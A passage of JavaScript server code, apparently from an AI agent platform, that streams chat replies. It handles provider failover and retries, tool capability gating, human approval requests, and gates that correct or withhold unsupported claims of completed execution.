      safeLog('GATE2', `[chat] intent=${finalRoute} allowSet=${_intentAllow ? _intentAllow.size : 'ALL'} denied=${JSON.stringify(_capDenied)}`);
      try { const { announce } = require('./lib/events'); announce.tool('gate', { source: 'babysitter', step: 'capability_gate', route: finalRoute, denied: _capDenied }); } catch {}
      // SAMPLING PASSTHROUGH (2026-08-26): client may send camelCase sampling
      // opts (topP/topK/seed/frequencyPenalty/presencePenalty/maxTokens).
      // llm-provider's samplingParams() capability-gates them per provider —
      // unsupported keys are stripped before the wire, so this is always safe.
      const _sampling = {};
      for (const k of ['temperature','topP','topK','maxTokens','frequencyPenalty','presencePenalty','seed']) {
        if (body[k] !== undefined && body[k] !== null) _sampling[k] = body[k];
      }
      _chatOpts = Object.assign({ model: _chatModel, provider: _chatProvider, tools: effectiveLease ? (_explicitChatTools !== null ? _explicitChatTools : getAgentTools()) : [], sessionId: sessionId || undefined, __explicitAuto: _explicitAuto /* TVG S6: suppress pin-file re-adoption in streamChatAuto */ }, _sampling);
      // Attempt receipts live on _chatOpts so BOTH stream attempts and the
      // final telemetry see the same chain (streamChatAuto writes
      // opts.__providerAttempts onto the object we pass in).
      let fullReply = '';
      let servedModel = '';
      let servedProvider = _chatProvider || '';  // MANUAL pin: streamChat chunks may not echo provider
      let attempt1ok = false;
      let attempt2ok = false;
      let attempt1err = null;
      let attempt2err = null;

      // Attempt 1
      try {
        safeLog('CHAT', `attempt=1 provider=${_chatProvider || 'auto'} model=${_chatModel || 'default'} message=${String(message).slice(0, 30)}`);
        // PROVIDER INPUT TRACE — persona deep-dive instrument (redacted manifest).
        try {
          const { buildTrace, assertTraceLaws } = require('./lib/provider-input-trace');
          const _trace = buildTrace({
            messages: chatMessages,
            tools: _chatOpts.tools || [],
            meta: {
              sessionId, turnId: null, route: 'CHAT',
              lease: effectiveLease || null,
              leaseSource: effectiveLease ? effectiveLease.source : null,
              leaseAction: effectiveLease ? effectiveLease.action : null,
              // ROUTE TRUTH: trace must show the requested-vs-final split.
              requestedMode: body.interactionMode || 'CHAT',
              requestedProvider: body.provider || 'auto',
              requestedModel: body.model || 'auto',
              workspace: body.workspace || null, cwd: body.cwd || process.cwd(),
            },
          });
          safeLog('PROVIDER_INPUT_TRACE', JSON.stringify(_trace).slice(0, 1500));
          assertTraceLaws(_trace);
        } catch (traceErr) {
          if (traceErr.code === 'PROVIDER_INPUT_LAW_VIOLATION') {
            safeLog('PROVIDER_INPUT_TRACE_LAW_VIOLATION', traceErr.message);
          } // non-law errors: tracing must never break transport
        }
        // MODEL ROUTING AUTHORITY: MANUAL pin (explicit provider AND/OR model)
        // uses streamChat directly — no silent provider roulette. streamChatAuto
        // is reserved for AUTO mode where routing IS the contract.
        // P0 PROVIDER TRANSPORT RECOVERY: in AUTO (unpinned), attempt 1 goes
        // through streamChatAuto WITH allowPartialFailover so a dead first
        // provider fails over to the next qualified candidate INSIDE this same
        // turn — the operator must never have to manually defibrillate the UI.
        const _autoMode = !_chatProvider && !_chatModel;
        const _streamFn = _autoMode
          ? LLM.streamChatAuto
          : ((_chatProvider && LLM.streamChat) ? LLM.streamChat : (LLM.streamChatAuto || LLM.streamChat));
        _streamOpts = Object.assign({}, _chatOpts);
        if (_autoMode) { _streamOpts.allowPartialFailover = true; }
        for await (const chunk of FILTER.filterVisibleStream(_streamFn(chatMessages, _streamOpts))) {
          // provider-retry-reset = previous candidate abandoned mid-draft.
          // Discard its partial text so the next provider's answer is clean,
          // and surface it as in-turn activity, not a new failure card.
          if (chunk.type === 'provider-retry-reset') {
            fullReply = '';
            sseEvent(res, 'attempt', eventPayload(SSE_CTX, {
              attemptActivity: 'provider_reset', from: chunk.from || null, reason: chunk.reason || null,
            }));
            continue;
          }
          if (chunk.done) {
            servedModel    = chunk.model    || servedModel;
            servedProvider = chunk.provider || servedProvider;
            break;
          }
          // STREAM LAW: filterVisibleStream yields ONLY visible content.
          // reasoning arrives as chunk.reasoning (metadata) — never concatenated.
          const rawReasoning = chunk.reasoning || '';
          if (rawReasoning) {
            sseEvent(res, 'reasoning', { delta: rawReasoning, model: chunk.model || servedModel, provider: chunk.provider || servedProvider });
          }
          const text = chunk.content;
          if (text) {
            fullReply += text;
            sseEvent(res, 'token', { content: text, model: chunk.model || servedModel, provider: chunk.provider || servedProvider });
          }
          servedModel    = chunk.model    || servedModel;
          servedProvider = chunk.provider || servedProvider;
        }
        attempt1ok = !!fullReply.trim();
        safeLog('CHAT', `attempt=1 result=${attempt1ok ? 'OK contentLength=' + fullReply.length : 'EMPTY'}`);
      } catch (e) {
        attempt1err = e && e.message ? e.message : String(e);
        safeLog('CHAT', `attempt=1 exception=${attempt1err}`);
      }
      // Hoist the attempt chain out of the try block so the telemetry receipt
      // can read it regardless of which attempt succeeded. Assign to the
      // handler-scope contract variable (chat-fast lane).
      _providerAttemptsReceipt = (_streamOpts && _streamOpts.__providerAttempts)
        || (_chatOpts && _chatOpts.__providerAttempts) || [];

      // Attempt 2 — if attempt 1 returned empty OR produced word-soup garbage (AUTO only)
      const _soup = !executionLease && fullReply.trim() && _isWordSoup(fullReply);
      if (_soup) safeLog('CHAT', `attempt=1 WORD_SOUP_REJECTED len=${fullReply.length} — retrying`);
      if (!fullReply.trim() || _soup) {
        if (_soup) fullReply = '';
        try {
          safeLog('CHAT', `attempt=2 provider=${_chatProvider || 'auto'} model=${_chatModel || 'default'}`);
          // MANUAL PIN LAW (2026-08-26): attempt-2 retry may re-attempt the SAME
          // pin (not a model switch) but must NEVER expand into other pools when
          // a pin is present. Parity with the nonstream lane (:6467).
          const _pinPresent = !!(_chatProvider || _chatModel);
          const _opts2 = Object.assign({}, _chatOpts, {
            allowPartialFailover: !_pinPresent,
            failClosedManual: _pinPresent || !!(_chatOpts && _chatOpts.failClosedManual),
          });
          for await (const chunk of FILTER.filterVisibleStream(LLM.streamChatAuto(chatMessages, _opts2))) {
            if (chunk.type === 'provider-retry-reset') {
              fullReply = '';
              sseEvent(res, 'attempt', eventPayload(SSE_CTX, {
                attemptActivity: 'provider_reset', from: chunk.from || null, reason: chunk.reason || null,
              }));
              continue;
            }
            if (chunk.done) {
              servedModel    = chunk.model    || servedModel;
              servedProvider = chunk.provider || servedProvider;
              break;
            }
            // STREAM LAW: filterVisibleStream yields ONLY visible content.
            // Reasoning deltas stream to the thinking bubble as their own event.
            const rawReasoning = chunk.reasoning || '';
            if (rawReasoning) {
              sseEvent(res, 'reasoning', { delta: rawReasoning, model: chunk.model || servedModel, provider: chunk.provider || servedProvider });
            }
            const text = chunk.content;
            if (text) {
              fullReply += text;
              sseEvent(res, 'token', { content: text, model: chunk.model || servedModel, provider: chunk.provider || servedProvider });
            }
            servedModel    = chunk.model    || servedModel;
            servedProvider = chunk.provider || servedProvider;
          }
          attempt2ok = !!fullReply.trim();
          safeLog('CHAT', `attempt=2 result=${attempt2ok ? 'OK contentLength=' + fullReply.length : 'EMPTY'}`);
        } catch (e) {
          attempt2err = e && e.message ? e.message : String(e);
          safeLog('CHAT', `attempt=2 exception=${attempt2err}`);
        }
      }

      // Terminal failure — both attempts empty or errored
      if (!fullReply.trim()) {
        safeLog('CHAT', `TERMINAL_EMPTY provider=${servedProvider || 'unknown'} model=${servedModel || 'unknown'} attempt1ok=${attempt1ok} attempt2ok=${attempt2ok}`);
        sseEvent(res, 'error', {
          error: 'CHAT_PROVIDER_EMPTY_OUTPUT',
          provider: servedProvider || null,
          model: servedModel || null,
          attempt1: attempt1ok ? 'ok' : (attempt1err ? 'error' : 'empty'),
          attempt2: attempt2ok ? 'ok' : (attempt2err ? 'error' : 'empty'),
        });
        return res.end();
      }

      fullReply = _stripToolSentinels(fullReply, sessionId);
      // ── EXECUTION-PROMISE CONTRADICTION GATE (P0): the chat-fast lane ALWAYS
      // runs CHAT / no lease / 0 calls, so any immediate-action language
      // ("on it", "let me run", "I'm scanning") is a truth violation by
      // definition. This gate was previously dead code — zero callers.
      // Enforcement: log + SSE truth-gate + append a mandatory truthful
      // correction so the delivered reply states execution was NOT performed.
      const _promiseViolations = RT.checkExecutionPromises(fullReply);
      if (_promiseViolations.length) {
        safeLog('EXECUTION_PROMISE_CONTRADICTION', JSON.stringify({
          sessionId, matched: _promiseViolations.map(v => v.matchedText),
        }));
        sseEvent(res, 'truth-gate', { code: 'EXECUTION_PROMISE_CONTRADICTION',
          violations: _promiseViolations, enforcement: 'correction_appended' });
        const _correction = '\n\n[CORRECTION] The above promised immediate execution, but this turn ran in CHAT mode with no execution lease and zero tool calls — nothing was executed. Hit Execute (or arm DRIVE Autonomous) and resend to run this for real.';
        fullReply += _correction;
        sseEvent(res, 'token', { content: _correction,
          model: servedModel || null, provider: servedProvider || null });
      }
      appendChatTurn(sessionId, 'user', message, source);
      const _chatDoneAt = Date.now();
      // MODEL TRUTH RECEIPT — chat-fast path gets the same telemetry object.
      const _chatTelemetry = {
              requestedProvider: body.provider || 'auto',
              requestedModel: body.model || 'auto',
              provider: servedProvider || null,
              model: servedModel || null,
              route: 'CHAT',
              lease: null, toolCalls: 0, agentCalls: 0, skillCalls: 0,
              // SUCCESS RECEIPT (chat-fast lane): same attempt chain contract as
              // the runAgent lane — every provider tried + failure class.
              providerAttempts: (_providerAttemptsReceipt || []).map((a, i) => ({
                attempt: i + 1, provider: a.provider || null, ok: !!a.ok,
                failureClass: a.failureClass || (a.ok ? null : (a.reason || null)),
                skipped: a.skipped || null, cooldownMs: a.cooldownMs || 0,
              })),
              fallbackCount: 0, fallbackPath: [],
              promptTokens: null, completionTokens: null, reasoningTokens: null, totalTokens: null,
              reasoningState: null, ttftMs: null,
              durationMs: _chatDoneAt - _msgReceivedAt,
              status: 'complete',
              bindings: bindings.length ? bindings : null,
              capsCount: _bindingCaps ? _bindingCaps.caps.length : null,
            };
      appendChatTurn(sessionId, 'assistant', fullReply, source, _chatTelemetry);
      // CANONICAL ROUTE TRUTH (single receipt): built once, after the reply is
      // final, from the real attempt chain. Surfaces consume — never reconstruct.
      // CANONICAL ROUTE TRUTH: build the one RoutingReceipt for this turn from
      // the same evidence the telemetry used. Surfaces consume this; they never
      // reconstruct routing truth themselves.
      let _receipt = null;
      try {
        _receipt = RR.buildReceipt({
          sessionId,
          requestedProvider: body.provider || null,
          requestedModel: body.model || null,
          providerAttempts: _providerAttemptsReceipt,
          servedProvider, servedModel,
          replyText: fullReply,
          manualOverrideApplied: (_streamOpts && _streamOpts.__manualOverrideApplied) || null,
          scoredPick: (_streamOpts && _streamOpts.__scoredRouterApplied) || null,
          affinityApplied: (_streamOpts && _streamOpts.__affinityApplied) || null,
          inferenceNode: 'home-core',
          executionNode: null,
        });
        _chatTelemetry.routingReceipt = _receipt;
      } catch (e) { safeLog('CHAT', `routing-receipt build failed (non-fatal): ${e && e.message}`); }
      sseEvent(res, 'phase', { phase: 'done', state: 'DONE',
        durationMs: _chatDoneAt - _msgReceivedAt });
      sseEvent(res, 'telemetry', { ..._chatTelemetry, type: 'telemetry' });
      if (_receipt) {
        sseEvent(res, 'routing-receipt', { receipt: _receipt });
        safeLog('ROUTING_RECEIPT', JSON.stringify(_receipt).slice(0, 1200));
      }
      // MODE-OFFER LAW (chat-fast): runtime detected EXECUTE intent but no lease
      // → tell the surface with a structured field so it can offer Run-once /
      // Switch-to-Work. Never inferred by the model; never parsed from text.
      const _modeOffer = (!effectiveLease && chatRoute === TA.INTENT_CLASSES.EXECUTE)
        ? { kind: 'EXECUTION_INTENT_NO_LEASE', offers: ['RUN_ONCE', 'SWITCH_TO_WORK'] }
        : undefined;
      if (_modeOffer) sseEvent(res, 'mode-offer', _modeOffer);
      sseEvent(res, 'done', eventPayload(SSE_CTX, {
        ok: true,
        status: 'complete',
        reply: fullReply,
        model: servedModel,
        provider: servedProvider || null,
        source,
        sessionId,
        historyTurns: chatHistory.length,
        capsuleId: SSE_CTX.capsuleId != null ? SSE_CTX.capsuleId : null,
        modeOffer: _modeOffer || null,
        telemetry: _chatTelemetry,
      }));
      return res.end();
    }

    // Use the real agent-loop (tool-calling brain) instead of raw llm.streamChat.
    // This unifies all three surfaces: CLI ask, WebUI, TUI, and all gateways
    // (Discord, Telegram, email) hit the same agentic engine.
    // (runAgent/getAgentTools/buildChatSystemPrompt destructured at function top — TDZ fix.)
    // Same module instance the loop consumes, so a pause aimed at this run is
    // visible to both ends of the stream.
    const PSTEER_SSE = (() => { try { return require('./lib/priority-steer'); } catch { return null; } })();
    let fullReply = '';
    let modelName = body.model || '';
    let _bindingCaps = null;
    let _explicitTools = null;
    let providerName = body.provider || '';
    const providerFailovers = [];
    const turnIntegrityEvents = [];
    let toolCallsUsed = 0;
    // Claim-gate evidence: ordered trace of executed tools this turn
    // (consumed by lib/execution-claim-gate.js evaluate() at done).
    const _toolEvidence = [];
    let runOk = true;
    let runStatus = 'complete';
    let maxTurnsHit = false;
    let runId = null;
    let traceStats = null;
    // missionId is created once at mission start and carried through every SSE event.
    // Agents that don't go through the semantic dispatch path create it here.
    const missionId = semantic && semantic.mission && semantic.mission.missionId
      ? String(semantic.mission.missionId)
      : null;
    // Token burn — captured from SSE token events and the done event's usage payload
    let totalTokensUsed = 0;
    let promptTokensUsed = 0;
    let completionTokensUsed = 0;
    // ── MODEL TRUTH TELEMETRY (requested ≠ resolved) ──────────────────────
    const requestedProvider = body.provider || 'auto';
    const requestedModel = body.model || 'auto';
    const executionLeaseKind = executionLease ? (executionLease.source || executionLease.kind || 'lease') : null;
    const _t0 = Date.now();
    let ttftMs = null;             // first token latency
    let reasoningTokensUsed = null; // only when provider supplies it — never fabricated
    let reasoningState = null;
    let agentCallsUsed = 0, skillCallsUsed = 0;
    void agentCallsUsed; void skillCallsUsed;

    // Operator STOP (AbortController) or browser close → clean up gracefully.
    // When the fetch is aborted the HTTP connection drops and Express sets
    // req.abortSignal.aborted = true. Listen for that and emit an abort receipt
    // to the cockpit so the UI transitions to CANCELED instead of ERROR.
    if (req.abortSignal) {
      req.abortSignal.addEventListener('abort', () => {
        runStatus = 'canceled';
        runOk = false;
        try { require('./lib/missions').cancelMission(); } catch { /* best-effort */ }
        try {
          sseEvent(res, 'abort', { missionId: runId, sessionId, reason: 'operator_stop' });
          sseEvent(res, 'done', {
            ok: false, status: 'canceled', reply: fullReply,
            model: modelName, provider: providerName || null,
            providerStatus: 'canceled', toolCalls: toolCallsUsed,
            source, sessionId, historyTurns: getChatHistory(sessionId).length, runId,
            totalTokens: totalTokensUsed, promptTokens: promptTokensUsed, completionTokens: completionTokensUsed,
          });
          res.end();
        } catch { /* stream may already be closed */ }
      }, { once: true });
    }

    // DEFENSIVE: wrap the runAgent for-await so synchronous throws from
    // runAgent setup (before the first await) are caught and sent as SSE
    // error events, rather than crashing the TCP stream and producing
    // "network error" in the browser.
    let _runAgentIter;
    // Push closure vars into SSE_CTX so every sseEvent() call inside the loop
    // gets sessionId / missionId without each call site having to pass them.
    // runId starts as null — it arrives inside the done event and gets captured
    // from there for the final done event (line ~909).
    SET_SSE_CTX({ sessionId, missionId: missionId || null, runId: null, turnId: null });
    try {
      // SLASH BINDINGS (§7): compute effective caps from explicit user-bound set.
      // Gate 2 PROVEN: tools come ONLY from the bound set when bindings exist —
      // never defaults. caps:[] with an exec binding = zero tool schemas reach
      // the provider, exactly as the operator bound it.
      _bindingCaps = bindings.length ? computeEffectiveCaps(bindings) : null;
      _explicitTools = _bindingCaps && _bindingCaps.caps.length
        ? getAgentTools().filter(t => _bindingCaps.caps.includes((t.function && t.function.name) || t.name))
        : null;

      // BABYSITTER CAPABILITY GATE: with a lease active, narrow the authorized
      // tool set by semantic intent class. Narrow-only: can never widen a set
      // (no-lease turns and unrestricted classes pass through unchanged).
      const _bsIntentClass = chatIntent ? chatIntent.route : null;
      if (_bsIntentClass && effectiveLease && (_explicitTools === null || Array.isArray(_explicitTools))) {
        const _bsBase = _explicitTools !== null ? _explicitTools : getAgentTools();
        const _bsGate = BABYSITTER.capabilityGate({ intentClass: _bsIntentClass, tools: _bsBase, route: finalRoute, leaseSource: effectiveLease.source || String(effectiveLease) });
        if (_bsGate.narrowed) {
          _explicitTools = _bsGate.tools;
          sseEvent('babysitter.capability_gate', { intent_class: _bsIntentClass, allowed: _bsGate.tools.map(t => (t.function && t.function.name) || t.name), denied: _bsGate.denied }, 'info');
        }
      }

      _runAgentIter = runAgent({
          prompt: attachmentPreamble(body.attachments) + message,
          history: priorHistory,                    // ← the fix: carry the conversation
          model: body.model || undefined,
          provider: body.provider || undefined,
          // Mission envelope: the composer's controls are execution state, not
          // decoration. Normalised in lib/mission-envelope.js so a surface that
          // sends nothing still gets safe defaults.
          //
          // EXECUTION LEASE — Gate 1 of the authorization contract.
          // authorizeExecution() was called before this; lease is passed here.
          // If null, the executor asserts and refuses (Gate 3 O-ring).
          opts: { maxTokens: 4096, temperature: 0.7, sessionId, envelope: body.envelope || {}, tools: _explicitTools || getAgentTools(), executionLease: effectiveLease,
                  // WORK LONG-HORIZON LAW: active WORK_SESSION lifts the turn cap
                  workSessionActive: !!(effectiveLease && effectiveLease.source === 'WORK_SESSION'),
                  // THINK LEVEL: composer slider rides through to the provider adapter
                  thinkLevel: body.thinkLevel,
                  // DEEP EXECUTION PARITY: mission lineage + bounds ride opts so
                  // every tool step checkpoints under one lease/mission identity.
                  missionId: missionId || null,
                  budgetTokens: Number(body.budgetTokens || 0),
                  // CONTINUATION LAW: mode/executionIntent must reach the agent
                  // loop or the WORK-mode completion critic never arms
                  // (agent-loop.js gates it on executionMode === 'work').
                  mode: (_mode === 'WORK') ? 'work' : 'chat',
                  executionIntent: !!body.executionIntent,
                  executionLease: effectiveLease },
        });
    } catch (runInitErr) {
      console.error('[handleChatStream] runAgent() synchronous throw:', runInitErr && runInitErr.message ? runInitErr.message : String(runInitErr));
      console.error('[handleChatStream] stack:', runInitErr && runInitErr.stack ? runInitErr.stack.slice(0, 800) : 'no stack');
      sseEvent(res, 'error', { error: 'runAgent init failed: ' + (runInitErr && runInitErr.message ? runInitErr.message : String(runInitErr)) });
      return res.end();
    }
    // If the SSE client disconnects (browser closed, network drop, tab refreshed),
    // the socket closes and res.write() starts failing. Without this handler the
    // agent loop keeps running in the dark — wait() polls forever, the SSE stream
    // feeds /dev/null, and the server accumulates a ghost mission. Catch it here
    // and abort the iterator so wait() throws and the loop exits cleanly.
    res.on('error', (err) => {
      console.warn('[SSE] client disconnected, aborting agent loop:', err && err.message ? err.message : String(err));
      if (_runAgentIter && typeof _runAgentIter.return === 'function') _runAgentIter.return();
    });
    // Approval heartbeat: SSE comment frames sent while waiting for operator resolution.
    // Long approval waits (up to 10 min) can cause intermediaries to close a silent SSE
    // pipe. Comment frames every 20s keep the pipe warm without adding semantic noise.
    // Helpers declared at function scope above (visible to the catch block).

    // Declare here so the assignment inside the for-await loop is accessible
    // at the try/catch boundary below (line ~1253). Using let (not const) because
    // the value is assigned inside the loop and read outside it.
    let _lastCapsuleId = null;
    // STREAM LAW: tool sentinels are stripped from the VISIBLE stream as it
    // flows — not just from the final reply. Cockpit renders tokens live, so
    // a per-reply strip is too late (that's how <|tool_call_start|>[bash...]
    // reached the screen on 23:59).
    const _scrubber = new _SentinelScrubber(sessionId);
    // STREAM LAW parity: the agent-loop lane must apply the same stateful
    // thinking filter as the direct lanes (:1401/:1451). Agent-loop tokens come
    // from streamChatAuto via lib/agent-loop.js which yields provider chunks
    // unfiltered — a <think> tag split across chunks would leak into the reply.
    const _thinkFilter = new FILTER.ThinkingFilter();

    for await (const ev of _runAgentIter) {
      // When the operator stops a run, the abort listener sends done(status:canceled)
      // and closes the SSE stream. The agent may still be running — do not process
      // any further events from it. The cancellation terminal state is already sent.
      if (req.abortSignal && req.abortSignal.aborted) break;
      // Next event arrived — clear the approval heartbeat (resolved or still-pending
      // but an event is proof the stream is alive and agent is responding).
      clearApprovalHeartbeat();

      if (ev.type === 'token') {
        const _thinkClean = _thinkFilter.push(String(ev.content || ''));
        const _cleanChunk = _scrubber.push(_thinkClean);
        fullReply += _cleanChunk || '';
        modelName = ev.model || modelName;
        providerName = ev.provider || providerName;
        if (ttftMs === null && ev.content) ttftMs = Date.now() - _t0;
        if (_cleanChunk) sseEvent(res, 'token', { content: _cleanChunk, model: ev.model, provider: ev.provider || providerName });
      } else if (ev.type === 'usage') {
        // Provider-supplied usage metadata — never fabricated.
        if (ev.usage && typeof ev.usage === 'object') {
          promptTokensUsed = ev.usage.prompt_tokens ?? promptTokensUsed;
          completionTokensUsed = ev.usage.completion_tokens ?? completionTokensUsed;
          totalTokensUsed = ev.usage.total_tokens ?? (promptTokensUsed + completionTokensUsed);
          if (ev.usage.reasoning_tokens != null) reasoningTokensUsed = ev.usage.reasoning_tokens;
        }
      } else if (ev.type === 'thinking-state') {
        reasoningState = ev.state || ev.phase || 'thinking';
      } else if (ev.type === 'turn-integrity') {
        // Transport evidence: the model's stream did not arrive whole. Surfaced
        // so an incomplete answer is visible as damage rather than read as a
        // short but finished reply.
        turnIntegrityEvents.push({ turn: ev.turn, classification: ev.classification,
          defects: (ev.defects || []).map(d => d.type) });
        sseEvent(res, 'turn-integrity', { ok: false, turn: ev.turn,
          classification: ev.classification,
          defects: (ev.defects || []).map(d => ({ type: d.type, detail: d.detail })),
          lastConfirmedSeq: ev.lastConfirmedSeq, expectedNextSeq: ev.expectedNextSeq,
          terminatorPresent: ev.terminatorPresent,
          observedBytes: ev.observedBytes, declaredBytes: ev.declaredBytes });
      } else if (ev.type === 'provider-failover') {
        const failover = { from: ev.from, to: ev.to, reason: ev.reason,
          failureClass: ev.failureClass || null,
          statusCode: ev.statusCode || null, detail: ev.detail || null,
          cooldownMs: ev.cooldownMs || 0, cooldownUntil: ev.cooldownUntil || null };
        providerFailovers.push(failover);
        sseEvent(res, 'provider-failover', eventPayload(SSE_CTX, failover));
        sseEvent(res, 'attempt', eventPayload(SSE_CTX, {
          attemptActivity: 'failover', from: ev.from || null, to: ev.to || null,
          failureClass: ev.failureClass || null, reason: ev.reason || null,
        }));
      } else if (ev.type === 'step-receipt') {
        // DEEP EXECUTION PARITY: per-step receipt rides the stream so surfaces
        // can show exactly which tool steps completed under the lease.
        sseEvent(res, 'step-receipt', eventPayload(SSE_CTX, {
          turn: ev.turn ?? null, tool: ev.tool || null, ok: ev.ok !== false,
          stepIndex: ev.stepIndex ?? null, capsuleId: ev.capsuleId || null,
        }));
      } else if (ev.type === 'lease-revoked') {
        sseEvent(res, 'lease-revoked', eventPayload(SSE_CTX, {
          tool: ev.tool || null, executedSteps: ev.executedSteps ?? 0, capsuleId: ev.capsuleId || null,
        }));
      } else if (ev.type === 'budget-checkpoint') {
        // UNRESTRICTED LAW: no refusal surface — compact-and-continue notice,
        // not a wall. Rides the legacy SSE name so existing cockpit listeners
        // keep working; action:'compacted' marks it telemetry-only.
        sseEvent(res, 'budget-exceeded', eventPayload(SSE_CTX, {
          spentEstTokens: ev.spentEstTokens ?? null, budgetTokens: ev.budgetTokens ?? null,
          capsuleId: ev.capsuleId || null, action: 'compacted',
        }));
      } else if (ev.type === 'budget-exceeded') {   // legacy emitter compat
        sseEvent(res, 'budget-exceeded', eventPayload(SSE_CTX, {
          spentEstTokens: ev.spentEstTokens ?? null, budgetTokens: ev.budgetTokens ?? null,
          capsuleId: ev.capsuleId || null,
        }));
      } else if (ev.type === 'steering') {
        // Phase 3 — every governed turn announces its capsule.
        // agent-loop yields activeRules as capsule.activeRules.length (a number).
        // The SSE producer MUST NOT call .length on it — just use it directly.
        // TEMP DEBUG:
        safeLog('STEER', 'activeRules=' + JSON.stringify(ev.activeRules));
        sseEvent(res, 'steering', eventPayload(SSE_CTX, {
          capsuleId: ev.capsuleId,
          status: ev.error ? 'blocked' : 'resolved',
          appliedAt: 'safe_point',
          activeRules: ev.activeRules || null,
          unresolvedConflicts: ev.unresolvedConflicts || null,
          sources: ev.sources || null,
          error: ev.error || null,
          ruleCount: typeof ev.activeRules === 'number' ? ev.activeRules : (ev.activeRules ? ev.activeRules.length : 0),
        }));
      } else if (ev.type === 'steering-blocked') {
        sseEvent(res, 'steering-blocked', eventPayload(SSE_CTX, { capsuleId: ev.capsuleId, conflicts: ev.conflicts }));
      } else if (ev.type === 'turn') {
        // Mission-loop turn boundary — the execution shell's heartbeat. The UI
        // shows one current action, not a raw transcript of every model call.
        // typeof ev.turn === 'number' guard: only update SSE_CTX when the value is
        // actually a number. `ev.turn != null` was loose equality — undefined != null
        // is TRUE, so absent ev.turn was overwriting SSE_CTX.turn with undefined,
        // which then propagated into the data object and into the SSE event.
        if (typeof ev.turn === 'number') SSE_CTX.turn = ev.turn;
        const turnNum = typeof ev.turn === 'number' ? ev.turn : (SSE_CTX.turn ?? 0);
        // TEMP DEBUG: trace what the turn event producer receives and sends
        safeLog('TURN', `ev.type=${ev.type} ev.turn=${JSON.stringify(ev.turn)} turnNum=${turnNum}`);
        sseEvent(res, 'turn', eventPayload(SSE_CTX, {
          turn: turnNum,
          turnId: 'turn_' + turnNum,
          maxTurns: ev.maxTurns ?? null,
          // These override ctx values when the model has given us more current info
          provider: providerName || null,
          model: modelName || null,
        }));
      } else if (ev.type === 'steer') {
        // SPEC-004 priority steer: the operator's live directive just entered
        // THIS run at a safe point. Every surface watching the stream sees it.
        sseEvent(res, 'steer', { directive: ev.directive, capsuleId: ev.capsuleId });
      } else if (ev.type === 'interrupted') {
        // SPEC-004 graceful pause — the turn was abandoned at a safe point and
        // the partial exchange below is still committed, so mission state kept.
        sseEvent(res, 'interrupted', { reason: ev.reason, turns: ev.turns, capsuleId: ev.capsuleId });
      } else if (ev.type === 'approval-request') {
        // Review rung — the turn is now parked waiting on a human. The UI
        // answers via POST /api/approvals.
        sseEvent(res, 'approval-request', eventPayload(SSE_CTX, { requestId: ev.requestId, tool: ev.tool,
          args: ev.args, expiresAt: ev.expiresAt }));
        startApprovalHeartbeat();
      } else if (ev.type === 'reacharound-approval-required') {
        // Eddie's law: Reacharound STOP and REPLAN are ask-first — operator
        // always has the final say. Forward to cockpit for the approval card.
        // Enrich with deterministic identity so the cockpit can route and display precisely.
        const toolName = ev.tool || 'reacharound.' + (ev.verdict || 'unknown').toLowerCase();
        sseEvent(res, 'reacharound-approval-required', eventPayload(SSE_CTX, {
          requestId: ev.requestId,
          approvalId: ev.requestId,          // explicit duplicate so cockpit handlers can use either name
          tool: toolName,
          verdict: ev.verdict,
          reason: ev.reason,
          replanHint: ev.replanHint || null,
          nextObjective: ev.nextObjective || null,
          progressScore: ev.progressScore != null ? ev.progressScore : null,
          stallScore: ev.stallScore != null ? ev.stallScore : null,
          trigger: ev.trigger || null,       // TOOL_FAILURE | STALL | LOOP | PERMISSION | null
          failedTool: ev.failedTool || null,
          expiresAt: ev.expiresAt || null,
          capsuleId: ev.capsuleId || null,
        }));
        startApprovalHeartbeat();
      } else if (ev.type === 'tool-approval-required') {
        // PERMISSION_DENIED requiring operator confirmation is NOT a tool failure.
        // It is an authorization wait state. Pause here, show the card, resume
        // only after the operator approves or denies.
        sseEvent(res, 'tool-approval-required', eventPayload(SSE_CTX, { requestId: ev.requestId,
          tool: ev.tool, args: ev.args, requiredPermission: ev.requiredPermission,
          reason: ev.reason, expiresAt: ev.expiresAt }));
        startApprovalHeartbeat();
      } else if (ev.type === 'approval-resolved') {
        sseEvent(res, 'approval-resolved', { requestId: ev.requestId, tool: ev.tool, decision: ev.decision });
      } else if (ev.type === 'dejavu') {
        // "We have been in this execution shape before." Evidence, not permission.
        sseEvent(res, 'dejavu', { confidence: ev.confidence, historicalRuns: ev.historicalRuns,
          verifiedRuns: ev.verifiedRuns, continuations: ev.continuations, closest: ev.closest });
      } else if (ev.type === 'completion-gate') {
        // The model drafted a completion claim that the execution trace cannot
        // yet prove. The draft tokens are withheld in agent-loop; surface the
        // correction state so the cockpit shows useful progress instead of a
        // mysterious pause while the model performs the missing work.
        sseEvent(res, 'completion-gate', {
          ok: false,
          attempt: ev.attempt,
          issues: ev.issues,
          evidence: ev.evidence,
          capsuleId: ev.capsuleId,
        });
      } else if (ev.type === 'completion-held') {
        sseEvent(res, 'completion-held', {
          ok: false,
          issues: ev.issues,
          evidence: ev.evidence,
          capsuleId: ev.capsuleId,
        });
      } else if (ev.type === 'completion-ready') {
        sseEvent(res, 'completion-ready', {
          ok: true,
          evidence: ev.evidence,
          capsuleId: ev.capsuleId,
        });
      } else if (ev.type === 'tool-call') {
        toolCallsUsed++;
        _toolEvidence.push(CG.evidenceEntry(_toolEvidence.length + 1, ev.tool, ev.args || {}, {}));
        // Forward tool-call to cockpit so the execution trail renders semantic rows.
        // Without this the counter increments but the UI gets no event — rows stay blank.
        sseEvent(res, 'tool-call', eventPayload(SSE_CTX, { tool: ev.tool, args: ev.args, capsuleId: ev.capsuleId || null }));
        // Track Reacharound state for cockpit display (survives cockpit reload)
        if (sessionId && ev.type) {
          REACHAROUND_STATES.set(sessionId, {
            updatedAt: Date.now(),
            latestEvent: ev.type,
          });
        }
      } else if (ev.type === 'reacharound') {
        // Capture Reacharound verdict after each tool turn — cockpit polls this endpoint.
        REACHAROUND_STATES.set(sessionId, {
          verdict:       ev.verdict,
          reason:        ev.reason,
          progressScore:  ev.progressScore,
          stallScore:    ev.stallScore,
          loopDetected:  ev.loopDetected,
          stalled:       ev.stalled,
          nextObjective: ev.nextObjective,
          turnsRemaining: ev.turnsRemaining,
          replanHint:    ev.replanHint,
          updatedAt:     Date.now(),
        });
        // Forward with canonical identity — ev may not carry missionId from agent-loop.
        sseEvent(res, 'reacharound', eventPayload(SSE_CTX, {
          verdict:       ev.verdict,
          reason:        ev.reason,
          progressScore:  ev.progressScore != null ? ev.progressScore : null,
          stallScore:    ev.stallScore != null ? ev.stallScore : null,
          loopDetected:  ev.loopDetected || null,
          stalled:       ev.stalled || null,
